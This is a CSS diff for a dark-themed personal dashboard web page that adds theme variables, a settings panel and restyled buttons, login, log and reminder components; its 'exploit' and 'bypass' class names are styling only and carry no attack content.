@@ -8,49 +8,96 @@
     /* Global Styles */
     * {
       box-sizing: border-box;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: var(--font-family, 'Segoe UI', sans-serif); /* Apply custom font if set */
+      font-size: var(--base-font-size, 16px); /* Apply custom font size if set */
     }
 
+    /* THE ONE BIG BACKGROUND FOR THE ENTIRE BODY */
     body {
         margin: 0;
         padding: 0;
-        /* NEW: Example of one big background. Adjust as desired. */
-        background: linear-gradient(135deg, var(--main-bg, #0d0d0d) 0%, #1a1a1a 100%) !important;
+        background: linear-gradient(135deg, var(--main-bg-start, #0d0d0d) 0%, var(--main-bg-end, #1a1a1a) 100%) !important;
         background-attachment: fixed !important; /* Keep background fixed when scrolling */
         color: var(--main-text-color, #e0e0e0);
-        transition: background-color 0.4s, color 0.4s;
-        font-size: 16px;
+        transition: background-color 0.4s, color 0.4s, font-size 0.2s, font-family 0.2s;
         line-height: 1.6;
         overflow-x: hidden;
     }
 
     body.light-theme {
-        --main-bg: #f0f0f0;
+        --main-bg-start: #f0f0f0;
+        --main-bg-end: #dddddd;
         --main-text-color: #333;
-        --box-bg-light: #fcfcfc;
-        --item-bg-alt-light: #eee;
-        --panel-bg-light: #fcfcfc;
-        --heading-color-light: #994d00;
-        --box-shadow-accent-light: rgba(255, 145, 77, 0.6);
-        --accent-color: var(--accent-color-light, #994d00);
-        /* NEW: Light theme also uses its specific colors */
-        background: linear-gradient(135deg, var(--main-bg, #f0f0f0) 0%, #dddddd 100%) !important;
+        --box-bg-dark: #fcfcfc; /* Now refers to light theme box bg */
+        --item-bg-alt-dark: #eee; /* Now refers to light theme alt item bg */
+        --panel-bg-dark: #fcfcfc; /* Now refers to light theme panel bg */
+        --heading-color-dark: #994d00; /* Now refers to light theme heading color */
+        --accent-color: var(--accent-color-light, #994d00); /* Lighter accent for light theme context */
+        /* Redefine the gradient for light theme body background */
+        background: linear-gradient(135deg, var(--main-bg-start, #f0f0f0) 0%, var(--main-bg-end, #dddddd) 100%) !important;
     }
 
     :root {
         --accent-color: #ff914d;
         --accent-color-light: #994d00;
-        --main-bg: #0d0d0d;
+        --main-bg-start: #0d0d0d;
+        --main-bg-end: #1a1a1a;
         --main-text-color: #e0e0e0;
-        --box-bg-dark: #2a2a2a;
-        --item-bg-alt-dark: #3b3b3b;
-        --panel-bg-dark: #2a2a2a;
-        --heading-color-dark: #ffbf80;
+        --box-bg-dark: #2a2a2a; /* Dark theme box background */
+        --item-bg-alt-dark: #3b3b3b; /* Dark theme alternate item background */
+        --panel-bg-dark: #2a2a2a; /* Dark theme panel background */
+        --heading-color-dark: #ffbf80; /* Dark theme heading color */
+
         --header-start-color: #ff914d;
         --header-end-color: #ffcc80;
+
+        /* For unified button hover/shadow effects */
+        --accent-color-light-hover: #ffb67a; /* Example lighter shade for hover */
+        --accent-color-hover-shadow: rgba(255, 145, 77, 0.8); /* Stronger shadow */
+
+        /* NEW: Custom properties for settings */
+        --font-family: 'Segoe UI', sans-serif;
+        --base-font-size: 16px;
+        --ui-animation-speed: 0.3s;
+        --button-border-radius: 8px;
+        --button-glow-intensity: 0.2;
+        --scrollbar-thumb-color: var(--accent-color);
+        --scrollbar-track-color: rgba(0,0,0,0.3);
     }
 
-    /* Loading Screen Styles (retained) */
+    /* Scrollbar Styling (NEW: Applied if custom scrollbar selected) */
+    body.custom-scrollbar::-webkit-scrollbar {
+      width: 12px;
+      height: 12px;
+    }
+    body.custom-scrollbar::-webkit-scrollbar-thumb {
+      background-color: var(--scrollbar-thumb-color);
+      border-radius: 6px;
+      border: 3px solid transparent;
+      background-clip: padding-box;
+    }
+    body.custom-scrollbar::-webkit-scrollbar-track {
+      background-color: var(--scrollbar-track-color);
+      border-radius: 6px;
+    }
+    body.custom-scrollbar .log-modal-body::-webkit-scrollbar-thumb,
+    body.custom-scrollbar .reminder-list-container::-webkit-scrollbar-thumb,
+    body.custom-scrollbar .info-panel::-webkit-scrollbar-thumb
+     {
+      background-color: var(--scrollbar-thumb-color);
+      border-radius: 6px;
+      border: 2px solid transparent; /* adjust border as needed for embedded elements */
+      background-clip: padding-box;
+    }
+    body.custom-scrollbar .log-modal-body::-webkit-scrollbar-track,
+    body.custom-scrollbar .reminder-list-container::-webkit-scrollbar-track,
+    body.custom-scrollbar .info-panel::-webkit-scrollbar-track
+    {
+        background-color: var(--scrollbar-track-color);
+        border-radius: 6px;
+    }
+
+    /* Loading Screen Styles (Retained) */
     .loading-screen {
         position: fixed;
         top: 0;
@@ -63,7 +110,7 @@
         justify-content: center;
         align-items: center;
         z-index: 9999;
-        transition: opacity 0.5s ease-out;
+        transition: opacity var(--ui-animation-speed) ease-out; /* Apply anim speed */
         opacity: 1;
     }
 
@@ -83,7 +130,7 @@
         background: rgba(255, 145, 77, 0.1);
         box-shadow: 0 0 15px var(--accent-color);
     }
-
+    /* Cube face transforms are fine */
     .front  { transform: rotateY(0deg) translateZ(30px); }
     .back   { transform: rotateY(180deg) translateZ(30px); }
     .right  { transform: rotateY(90deg) translateZ(30px); }
@@ -113,9 +160,9 @@
         visibility: hidden;
     }
 
-    /* Login System Styles */
+    /* Login System Styles (adjusted for square-ish look, etc.) */
     body.login-body {
-        background: linear-gradient(135deg, var(--main-bg, #0d0d0d) 0%, #1a1a1a 100%) !important;
+        background: linear-gradient(135deg, var(--main-bg-start, #0d0d0d) 0%, var(--main-bg-end, #1a1a1a) 100%) !important;
         background-attachment: fixed !important;
         color: #fff;
         display: flex;
@@ -125,15 +172,15 @@
     }
 
     .login-box {
-        background: var(--box-bg-dark, #1a1a1a);
-        border-radius: 15px;
+        background: var(--box-bg-dark); /* Use theme-defined box background */
+        border-radius: var(--button-border-radius); /* Use dynamic border radius */
         border: 2px solid var(--accent-color);
-        box-shadow: 0 0 25px rgba(255, 145, 77, 0.5);
+        box-shadow: 0 0 25px rgba(255, 145, 77, var(--button-glow-intensity)); /* Use dynamic glow */
         width: 400px;
         padding: 40px;
         text-align: center;
         position: relative;
-        transition: border-color 0.4s, box-shadow 0.4s, transform 0.3s ease-in-out;
+        transition: border-color var(--ui-animation-speed), box-shadow var(--ui-animation-speed), transform var(--ui-animation-speed) ease-in-out;
     }
 
     .login-box:hover {
@@ -142,7 +189,7 @@
     }
 
     .login-box.flashing {
-        animation: flashRed 0.4s ease-in-out 2;
+        animation: flashRed var(--ui-animation-speed) ease-in-out 2;
     }
 
     @keyframes flashRed {
@@ -154,7 +201,7 @@
         font-size: 1.8em;
         margin-bottom: 25px;
         font-family: 'Courier New', monospace;
-        color: var(--heading-color-dark, #ffcc80);
+        color: var(--heading-color-dark); /* Use theme-defined heading color */
         letter-spacing: 1px;
     }
 
@@ -167,7 +214,7 @@
         color: #fff;
         border-radius: 10px;
         font-size: 1.05em;
-        transition: border-color 0.3s, box-shadow 0.3s;
+        transition: border-color var(--ui-animation-speed), box-shadow var(--ui-animation-speed);
     }
 
     .login-box input:focus {
@@ -182,6 +229,7 @@
         justify-content: flex-start;
         margin-bottom: 20px;
         cursor: pointer;
+        user-select: none;
     }
     .show-password-container span {
         font-size: 0.95em;
@@ -196,7 +244,8 @@
         border-radius: 10px;
         position: relative;
         cursor: pointer;
-        transition: background-color 0.3s;
+        transition: background-color var(--ui-animation-speed);
+        flex-shrink: 0;
     }
     .show-password-container input[type="checkbox"]::before {
         content: '';
@@ -207,7 +256,7 @@
         height: 16px;
         background-color: white;
         border-radius: 50%;
-        transition: transform 0.3s;
+        transition: transform var(--ui-animation-speed);
     }
     .show-password-container input[type="checkbox"]:checked {
         background-color: var(--accent-color);
@@ -216,35 +265,43 @@
         transform: translateX(20px);
     }
 
-    /* NEW: Unified Orange Button Styling - No individual backgrounds */
+    /* NEW: Unified Orange Button Styling - All buttons transparent backgrounds, controlled by CSS variables */
     .login-box button,
     .action-button,
     .quickbar-container button,
     .button-grid-container .box button,
-    .button-grid-container .box a {
-        background: transparent !important; /* Force transparent background */
-        border: 2px solid var(--accent-color) !important; /* Visible accent border */
-        color: var(--accent-color) !important; /* Accent text color */
+    .button-grid-container .box a,
+    .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button,
+    .reminder-item button
+    {
+        background: transparent !important;
+        border: 2px solid var(--accent-color) !important;
+        color: var(--accent-color) !important;
         padding: 10px 18px;
-        border-radius: 8px;
+        border-radius: var(--button-border-radius); /* Use dynamic border radius */
         font-weight: bold;
         cursor: pointer;
-        transition: all 0.3s ease;
-        text-shadow: none; /* No text shadow to prevent conflicts */
-        box-shadow: 0 0 10px rgba(255, 145, 77, 0.2); /* Subtle accent glow */
+        transition: all var(--ui-animation-speed) ease; /* Apply anim speed */
+        text-shadow: none;
+        box-shadow: 0 0 10px rgba(255, 145, 77, var(--button-glow-intensity)); /* Use dynamic glow */
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
     }
 
     /* Exception: Panic Button is Red */
     #panicBtn {
         border-color: #ff4c4c !important;
         color: #ff4c4c !important;
-        box-shadow: 0 0 10px rgba(255, 76, 76, 0.2) !important;
+        box-shadow: 0 0 10px rgba(255, 76, 76, var(--button-glow-intensity)) !important;
     }
 
     #panicBtn:hover {
-        background-color: rgba(255, 76, 76, 0.2) !important; /* Faint red background on hover */
+        background-color: rgba(255, 76, 76, 0.2) !important;
         box-shadow: 0 0 15px rgba(255, 76, 76, 0.6) !important;
-        color: white !important; /* Make text white for contrast */
+        color: white !important;
     }
 
     /* Hover effect for all general buttons */
@@ -252,20 +309,25 @@
     .action-button:hover,
     .quickbar-container button:hover,
     .button-grid-container .box button:hover,
-    .button-grid-container .box a:hover {
-        background-color: rgba(255, 145, 77, 0.1) !important; /* Faint accent background on hover */
-        transform: translateY(-3px) scale(1.05); /* More animated */
-        box-shadow: 0 5px 20px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.6)) !important; /* Enhanced glow */
-        color: white !important; /* Text to white for highlight */
+    .button-grid-container .box a:hover,
+    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover,
+    .reminder-item button:hover {
+        background-color: rgba(255, 145, 77, 0.1) !important;
+        transform: translateY(-3px) scale(1.05);
+        box-shadow: 0 5px 20px var(--accent-color-hover-shadow) !important;
+        color: white !important;
     }
 
+    /* Active / Clicked state */
     .login-box button:active,
     .action-button:active,
     .quickbar-container button:active,
     .button-grid-container .box button:active,
-    .button-grid-container .box a:active {
+    .button-grid-container .box a:active,
+    .handbook-buttons a:active, .links-list a:active, .exploit-buttons a:active, .bypass-buttons button:active,
+    .reminder-item button:active {
         transform: translateY(1px) scale(0.95);
-        box-shadow: none !important;
+        box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2) !important;
     }
 
 
@@ -292,7 +354,7 @@
         color: #2a2a2a;
         box-shadow: 0 5px 20px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.4));
         border-radius: 15px 15px 0 0;
-        animation: slideInFromTop 0.8s ease-out;
+        animation: slideInFromTop var(--ui-animation-speed) ease-out; /* Apply anim speed */
         margin-bottom: 0;
     }
 
@@ -306,9 +368,9 @@
         to { opacity: 1; transform: translateY(0); }
     }
 
-    .dashboard-header h1 { font-size: 28px; font-family: 'Orbitron', sans-serif; color: #000; text-shadow: 1px 1px 2px rgba(255,255,255,0.3); }
-    .user-info { font-weight: bold; font-size: 1.05em; color: #333; }
-    .version-box { background: #ffd966; padding: 10px 18px; border-radius: 10px; color: #000; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+    .dashboard-header h1 { font-size: 1.8em; font-family: 'Orbitron', sans-serif; color: #000; text-shadow: 1px 1px 2px rgba(255,255,255,0.3); } /* Scaled relative to base-font-size */
+    .user-info { font-weight: bold; font-size: 1.05em; color: #333; } /* Scaled */
+    .version-box { background: #ffd966; padding: 10px 18px; border-radius: 10px; color: #000; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.2); font-size: 0.9em;} /* Scaled */
 
     .quickbar-container {
         display: flex;
@@ -316,41 +378,32 @@
         gap: 10px;
         justify-content: center;
         padding: 10px 20px;
-        background: var(--box-bg-dark);
+        background: var(--box-bg-dark); /* Now the "big background" for quickbar buttons */
         border-radius: 0 0 15px 15px;
         box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         margin-bottom: 25px;
-        transition: background-color 0.3s;
+        transition: background-color var(--ui-animation-speed); /* Apply anim speed */
     }
 
     body.dashboard-body.light-theme .quickbar-container {
-        background: #fdfdfd;
+        background: var(--box-bg-dark); /* Light theme equivalent background */
         box-shadow: 0 5px 15px rgba(0,0,0,0.1);
     }
     
     .quickbar-container button {
       padding: 10px 18px;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: all 0.3s ease;
       font-size: 0.9em;
       min-width: 100px;
       white-space: nowrap;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
     }
 
-    /* Grid for other main buttons */
+    /* Grid for panel-triggering buttons (each in a box) */
     .button-grid-container {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
       gap: 20px;
       margin-top: 20px;
-      animation: fadeInUp 0.5s 0.2s ease-out backwards;
+      animation: fadeInUp var(--ui-animation-speed) 0.2s ease-out backwards; /* Apply anim speed */
     }
     .button-grid-container .box {
       display: flex;
@@ -358,12 +411,14 @@
       align-items: stretch;
       justify-content: center;
       padding: 15px;
+      border-radius: var(--button-border-radius); /* Apply dynamic border radius */
     }
      .button-grid-container .box button,
      .button-grid-container .box a {
         width: 100%;
         padding: 14px;
         font-size: 1em;
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
      }
 
     .main-row {
@@ -371,16 +426,16 @@
         gap: 20px;
         margin-bottom: 20px;
         flex-wrap: wrap;
-        animation: fadeInUp 0.5s 0.6s ease-out backwards;
+        animation: fadeInUp var(--ui-animation-speed) 0.6s ease-out backwards; /* Apply anim speed */
     }
 
     .box {
         background-color: var(--box-bg-dark);
         padding: 25px;
-        border-radius: 15px;
-        box-shadow: 0 0 18px var(--box-shadow-accent-dark, rgba(255, 145, 77, 0.35));
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+        box-shadow: 0 0 18px rgba(255, 145, 77, var(--button-glow-intensity)); /* Apply dynamic glow */
         min-height: 130px;
-        transition: all 0.3s ease-in-out;
+        transition: all var(--ui-animation-speed) ease-in-out; /* Apply anim speed */
         flex: 1 1 320px;
         position: relative;
         overflow: hidden;
@@ -388,17 +443,17 @@
 
     .box:hover {
         transform: translateY(-5px);
-        box-shadow: 0 5px 22px var(--box-shadow-accent-dark-hover, rgba(255, 145, 77, 0.5));
+        box-shadow: 0 5px 22px var(--accent-color-hover-shadow); /* Use pre-calculated shadow */
     }
 
     body.dashboard-body.light-theme .box {
-        background-color: var(--box-bg-light);
+        background-color: var(--box-bg-dark);
         color: var(--main-text-color);
         box-shadow: 0 0 18px var(--box-shadow-accent-light);
     }
 
     .box h2 {
-        font-size: 20px;
+        font-size: 1.2em; /* Scaled */
         margin-top: 0;
         margin-bottom: 12px;
         color: var(--heading-color-dark);
@@ -410,24 +465,25 @@
     }
 
     body.dashboard-body.light-theme .box h2 {
-        color: var(--heading-color-light);
+        color: var(--heading-color-dark);
         border-bottom-color: rgba(153, 77, 0, 0.4);
     }
 
     /* NEW: Fading Notification System (Top Right) */
     #notificationContainer {
         position: fixed;
-        top: 90px; /* Position below the header/quickbar */
+        top: 90px;
         right: 20px;
         z-index: 1000;
         display: flex;
         flex-direction: column;
         gap: 10px;
         max-width: 300px;
+        pointer-events: none; /* Allow clicks to pass through initially */
     }
 
     .dashboard-notification {
-        background-color: rgba(42, 42, 42, 0.9); /* Dark background, semi-transparent */
+        background-color: rgba(42, 42, 42, 0.9);
         color: var(--main-text-color);
         padding: 12px 18px;
         border-radius: 8px;
@@ -435,13 +491,14 @@
         border-left: 3px solid var(--accent-color);
         opacity: 0;
         transform: translateY(10px);
-        animation: fadeInNotification 0.3s forwards;
-        position: relative; /* For the close button */
-        word-wrap: break-word; /* Ensure text wraps */
+        animation: fadeInNotification var(--ui-animation-speed) forwards; /* Apply anim speed */
+        position: relative;
+        word-wrap: break-word;
+        pointer-events: auto; /* Re-enable clicks for the notification itself */
     }
 
     .dashboard-notification.fade-out {
-        animation: fadeOutNotification 0.5s forwards 2.5s; /* Fade out after 2.5s display */
+        animation: fadeOutNotification var(--ui-animation-speed) forwards 2.5s; /* Fade out after 2.5s, apply anim speed */
     }
     
     @keyframes fadeInNotification {
@@ -469,7 +526,8 @@
         font-size: 0.9em;
         cursor: pointer;
         padding: 0;
-        transition: color 0.2s;
+        transition: color var(--ui-animation-speed); /* Apply anim speed */
+        pointer-events: auto;
     }
     .notification-close-btn:hover {
         color: white;
@@ -483,7 +541,7 @@
 
     /* Activity Log Modal */
     .log-modal-overlay {
-        display: none;
+        display: none; /* Hidden by default */
         position: fixed;
         top: 0;
         left: 0;
@@ -493,14 +551,14 @@
         z-index: 1001;
         justify-content: center;
         align-items: center;
-        animation: fadeIn 0.3s ease-out;
+        animation: fadeIn var(--ui-animation-speed) ease-out; /* Apply anim speed */
     }
 
     .log-modal-content {
         background-color: var(--panel-bg-dark);
-        border-radius: 15px;
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
         border: 2px solid var(--accent-color);
-        box-shadow: 0 0 25px rgba(255, 145, 77, 0.5);
+        box-shadow: 0 0 25px rgba(255, 145, 77, var(--button-glow-intensity)); /* Apply dynamic glow */
         padding: 30px;
         width: 80%;
         max-width: 700px;
@@ -524,8 +582,9 @@
         border: 1px solid #444;
         background-color: #3b3b3b;
         padding: 15px;
-        border-radius: 8px;
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
         margin-bottom: 20px;
+        color: var(--main-text-color);
     }
     .log-modal-body .log-entry {
         border-bottom: 1px dotted #555;
@@ -538,6 +597,12 @@
         font-size: 0.8em;
         color: #999;
         margin-right: 10px;
+        flex-shrink: 0;
+    }
+    .log-modal-body .log-entry {
+        display: flex;
+        align-items: flex-start;
+        word-break: break-word;
     }
     .log-modal-close-btn {
         position: absolute;
@@ -549,7 +614,7 @@
         cursor: pointer;
         background: none;
         border: none;
-        transition: transform 0.2s;
+        transition: transform var(--ui-animation-speed); /* Apply anim speed */
     }
     .log-modal-close-btn:hover {
         transform: scale(1.1);
@@ -557,13 +622,31 @@
 
 
     /* General UI components (adjusted or kept) */
-    .calendar { display: grid; grid-template-columns: repeat(7, 1fr); gap: 6px; margin-top: 15px; text-align: center; font-size: 13px; }
-    .calendar div { padding: 7px; background: #3f3f3f; border-radius: 5px; transition: background 0.2s ease, transform 0.1s ease; }
+    .calendar { display: grid; grid-template-columns: repeat(7, 1fr); gap: 6px; margin-top: 15px; text-align: center; font-size: 0.9em; } /* Scaled */
+    .calendar div { padding: 7px; background: #3f3f3f; border-radius: 5px; transition: background var(--ui-animation-speed), transform 0.1s ease; } /* Apply anim speed */
     .calendar div:hover:not(.today) { transform: translateY(-2px); background: #5a5a5a; }
     .today { background: var(--accent-color) !important; font-weight: bold; color: black; box-shadow: 0 0 10px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.7)); }
 
-    .info-panel { display: none; background-color: var(--panel-bg-dark); padding: 30px; border-radius: 15px; margin-top: 25px; box-shadow: 0 0 20px var(--box-shadow-accent-dark, rgba(255, 145, 77, 0.4)); animation: fadeInPanel 0.4s ease-out; }
-    .info-panel h2 { color: var(--accent-color); margin-bottom: 20px; font-size: 22px; border-bottom: 2px solid rgba(255, 145, 77, 0.6); padding-bottom: 10px; display: flex; align-items: center; gap: 10px; }
+    .info-panel {
+        display: none;
+        background-color: var(--panel-bg-dark);
+        padding: 30px;
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+        margin-top: 25px;
+        box-shadow: 0 0 20px rgba(255, 145, 77, var(--button-glow-intensity)); /* Apply dynamic glow */
+        animation: fadeInPanel var(--ui-animation-speed) ease-out; /* Apply anim speed */
+        transition: background-color var(--ui-animation-speed), box-shadow var(--ui-animation-speed); /* Apply anim speed */
+    }
+    .info-panel h2 {
+      font-size: 1.3em; /* Scaled */
+      color: var(--accent-color);
+      margin-bottom: 20px;
+      border-bottom: 2px solid rgba(255, 145, 77, 0.6);
+      padding-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
     @keyframes fadeInPanel { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
     /* WiFi Color Coding (retained) */
@@ -572,54 +655,206 @@
     .wifi-low { color: #f44336 !important; font-weight: bold !important; text-shadow: 0 0 5px rgba(244, 67, 54, 0.7); }
 
     .wifi-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 12px; margin-bottom: 15px; }
-    .wifi-grid div:first-child { font-weight: bold; color: var(--heading-color-dark, #ffcc80); }
-    .wifi-grid div { padding: 10px; background: #3f3f3f; border-radius: 7px; text-align: center; font-weight: normal; box-shadow: inset 0 0 5px rgba(0,0,0,0.2); }
+    .wifi-grid div:first-child { font-weight: bold; color: var(--heading-color-dark); }
+    .wifi-grid div { padding: 10px; background: #3f3f3f; border-radius: var(--button-border-radius); box-shadow: inset 0 0 5px rgba(0,0,0,0.2); font-size: 0.9em;} /* Scaled */
     .wifi-entry { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 12px; margin-bottom: 10px; align-items: center; }
-    .wifi-entry div { padding: 10px; background: #4a2b20; border-radius: 7px; text-align: center; font-size: 0.95em; }
+    .wifi-entry div { padding: 10px; background: #4a2b20; border-radius: var(--button-border-radius); text-align: center; font-size: 0.9em; } /* Scaled */
 
-    /* Special lists that now inherit global button style */
+    /* Special lists (buttons/links within) now inherit global button style */
     .links-list, .handbook-buttons, .exploit-buttons, .bypass-buttons {
         display: grid;
         grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
         gap: 12px;
         margin-top: 18px;
     }
-    /* Buttons/Links within these lists implicitly inherit the general orange style */
+    /* Buttons/Links within these lists implicitly inherit the general orange style, ensure color property */
     .links-list a, .handbook-buttons a, .exploit-buttons a, .bypass-buttons button {
-      box-shadow: 0 0 10px rgba(255, 145, 77, 0.2) !important;
       color: var(--accent-color) !important;
     }
+    /* For button/link items hover */
     .links-list a:hover, .handbook-buttons a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
-      box-shadow: 0 5px 20px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.6)) !important;
+      background-color: rgba(255, 145, 77, 0.1) !important;
+      color: white !important;
     }
-
 
     .ipad-options { display: flex; gap: 12px; margin-top: 18px; }
     .ipad-options button { flex: 1; }
-    .ipad-content, .bypass-content { display: none; background: #3c251d; padding: 20px; border-radius: 10px; margin-top: 18px; color: #ffccb3; }
+    .ipad-content, .bypass-content {
+        display: none;
+        background: #3c251d;
+        padding: 20px;
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+        margin-top: 18px;
+        color: #ffccb3;
+        font-size: 0.95em; /* Scaled */
+    }
 
-    /* Reminders Specific Styling (retained) */
+    /* Reminders Specific Styling */
     .reminder-form { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; align-items: flex-end; }
-    .reminder-form input { padding: 10px; border-radius: 8px; border: 1px solid #444; background-color: #3b3b3b; color: #e0e0e0; font-size: 1em; }
-    .reminder-form button { /* Inherits global button style */ }
+    .reminder-form input {
+      padding: 10px;
+      border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+      border: 1px solid #444;
+      background-color: #3b3b3b;
+      color: #e0e0e0;
+      font-size: 1em; /* Scaled */
+    }
+    /* Reminder form buttons inherit global orange style */
+    .reminder-form button { /* Styles set by global transparent orange button class */ }
     .reminder-form input[type="text"] { flex: 1 1 180px; }
     .reminder-form input[type="date"], .reminder-form input[type="time"] { flex: 1 1 120px; }
     .reminder-list-container { max-height: 400px; overflow-y: auto; padding-right: 10px; }
-    .reminder-item { padding: 12px 15px; margin-bottom: 8px; background: #4a2b20; border-radius: 8px; font-size: 0.95em; display: flex; justify-content: space-between; align-items: center; gap: 10px; }
+    .reminder-item {
+      padding: 12px 15px;
+      margin-bottom: 8px;
+      background: #4a2b20;
+      border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+      font-size: 0.95em; /* Scaled */
+      display: flex; justify-content: space-between; align-items: center; gap: 10px;
+    }
     .reminder-item.completed { text-decoration: line-through; opacity: 0.7; background-color: #2b2b2b; }
-    .reminder-item button { color: var(--accent-color) !important; } /* ensures delete/complete button text is accent-color */
-    .reminder-item button:hover { background-color: rgba(255, 145, 77, 0.1) !important;}
+    /* Reminder item buttons inherit global transparent orange button style */
+    .reminder-item button { /* Styles set by global transparent orange button class */ }
+    /* Ensure clear button uses global button styling */
+    #clearAllRemindersBtn {
+      margin-top: 20px;
+    }
 
-
-    /* Stats Panel Styling (retained) */
+    /* Stats Panel Styling */
     .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
-    .stats-item { background: #3c251d; padding: 15px; border-radius: 8px; border-left: 3px solid var(--accent-color); }
+    .stats-item {
+        background: #3c251d;
+        padding: 15px;
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+        border-left: 3px solid var(--accent-color);
+        font-size: 0.95em; /* Scaled */
+    }
     .stats-label { font-weight: bold; color: var(--heading-color-dark); margin-bottom: 5px; }
     .stats-value { font-family: 'Courier New', monospace; font-size: 1.1em; word-break: break-all; }
     
-    /* Media Player aspect ratio (retained) */
+    /* Media Player aspect ratio */
     #youtubePlayer iframe {
         display: block; /* Remove extra space below iframe */
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+    }
+
+    /* Settings Panel Styles */
+    .settings-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+        gap: 20px;
+        margin-top: 20px;
+    }
+
+    .setting-group {
+        background: #3c251d;
+        padding: 20px;
+        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
+        border-left: 4px solid var(--accent-color);
+        transition: background-color var(--ui-animation-speed); /* Apply anim speed */
+    }
+    body.dashboard-body.light-theme .setting-group {
+        background: #ffd999;
+        border-left-color: var(--accent-color-light);
+    }
+
+    .setting-group h3 {
+        color: var(--heading-color-dark);
+        margin-bottom: 15px;
+        border-bottom: 1px dashed rgba(255, 145, 77, 0.4);
+        padding-bottom: 8px;
+        font-size: 1.1em; /* Scaled */
+    }
+    body.dashboard-body.light-theme .setting-group h3 {
+        color: var(--heading-color-dark);
+        border-bottom-color: rgba(153, 77, 0, 0.3);
+    }
+
+    .setting-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 10px;
+        padding: 5px 0;
+        font-size: 0.95em; /* Scaled */
+    }
+    .setting-item label {
+        flex: 1;
+        margin-right: 15px;
+    }
+
+    /* Generic checkbox / toggle style in settings */
+    .setting-item input[type="checkbox"] {
+        appearance: none;
+        width: 35px; /* Slightly wider */
+        height: 18px; /* Slightly taller */
+        background-color: #777; /* Default background for checkbox */
+        border-radius: 9px;
+        position: relative;
+        cursor: pointer;
+        transition: background-color var(--ui-animation-speed);
+        flex-shrink: 0;
+    }
+    .setting-item input[type="checkbox"]::before {
+        content: '';
+        position: absolute;
+        left: 2px;
+        top: 2px;
+        width: 14px;
+        height: 14px;
+        background-color: white;
+        border-radius: 50%;
+        transition: transform var(--ui-animation-speed);
+    }
+    .setting-item input[type="checkbox"]:checked {
+        background-color: var(--accent-color);
+    }
+    .setting-item input[type="checkbox"]:checked::before {
+        transform: translateX(17px); /* Moves it to the right (35px width - 14px circle - 2x2px padding = 17px travel) */
+    }
+    body.dashboard-body.light-theme .setting-item input[type="checkbox"] {
+        background-color: #aaa;
+    }
+    body.dashboard-body.light-theme .setting-item input[type="checkbox"]:checked {
+        background-color: var(--accent-color);
+    }
+
+
+    .setting-item select, .setting-item input[type="range"] {
+        background-color: #3b3b3b;
+        color: #e0e0e0;
+        border: 1px solid #555;
+        padding: 5px 8px;
+        border-radius: 5px;
+        transition: background-color var(--ui-animation-speed), border-color var(--ui-animation-speed);
+        font-size: 0.95em; /* Scaled */
+    }
+    body.dashboard-body.light-theme .setting-item select,
+    body.dashboard-body.light-theme .setting-item input[type="range"] {
+        background-color: #f8f8f8;
+        color: #333;
+        border-color: #ccc;
+    }
+
+    .setting-item select:focus, .setting-item input:focus {
+        outline: none;
+        border-color: var(--accent-color);
+    }
+
+    .color-picker {
+        display: flex;
+        gap: 5px;
+        align-items: center;
+    }
+    .color-picker input[type="color"] {
+        width: 40px;
+        height: 25px;
+        padding: 2px;
+        border-radius: 5px;
+        border: 1px solid #555;
+        cursor: pointer;
+        background: transparent;
+        flex-shrink: 0;
     }
 
     /* Icon Styling */
@@ -629,11 +864,9 @@
         margin-right: 8px; 
     }
     
-    /* NEW: Custom "Activity Log" icon */
-    #activityLogBtn::before { content: '📜'; }
+    #activityLogBtn::before { content: '📜'; } /* NEW: Activity Log button icon */
 
-
-    /* Specific button icons - no color changes here */
+    /* Specific button icons */
     #calendarTitle::before { content: '🗓️'; }
     #updatesNotificationsTitle::before { content: '🔔'; }
     #sessionTime::before { content: '⏳'; }
@@ -668,9 +901,14 @@
     .button-grid-container button[onclick*='gamingPanel']::before { content: '🎮'; }
     .button-grid-container button[onclick*='musicPanel']::before { content: '🎧'; }
     .button-grid-container button[onclick*='keyboardPanel']::before { content: '⌨️'; }
+    /* RE-ADDED FEATURES' ICONS */
     .button-grid-container button[onclick*='reminderPanel']::before { content: '⏰'; }
     .button-grid-container button[onclick*='statsPanel']::before { content: '📈'; }
     .button-grid-container button[onclick*='mediaPanel']::before { content: '📺'; }
